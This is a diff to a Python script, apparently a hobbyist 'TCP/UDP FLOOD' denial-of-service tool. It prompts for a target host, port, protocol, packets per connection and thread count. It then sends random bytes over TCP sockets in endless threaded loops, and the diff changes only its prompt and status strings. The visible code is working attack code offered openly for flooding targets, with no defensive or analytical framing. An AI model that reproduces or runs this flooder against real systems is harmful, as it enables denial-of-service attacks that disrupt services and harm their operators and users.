@@ -5,11 +5,11 @@ import threading
 
 print("--> C0de By SP00FING <--")
 print("#-- TCP/UDP FLOOD --#")
-ip = str(input("Host/Ip : "))
-port = int(input("Port : "))
-choice = str(input("UDP ( y / n ) : "))
-times = int(input("Packets Per One Connection : "))
-threads = int(input("Threads : "))
+ip = str(input(" [+] Host/Ip : "))
+port = int(input(" [+] Port : "))
+choice = str(input(" [+] UDP ( y / n ) : "))
+times = int(input(" [+] Packets Per One Connection : "))
+threads = int(input(" [+] Threads : "))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
@@ -25,7 +25,7 @@ def run():
 
 def run2():
 	data = random._urandom(16)
-	i = random.choice(("[A]","[S]","[P]","[A]","[R]","[R]","[T]","[I]","[M]"))
+	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -33,9 +33,9 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Sent!!!")
+			print(i +" [+] Package Sent !")
 		except:
-			print(i +" Sent!!!")
+			print(i +" [+] Package Sent !")
 			pass
 			#s.close()
 			#print("[*] Error")
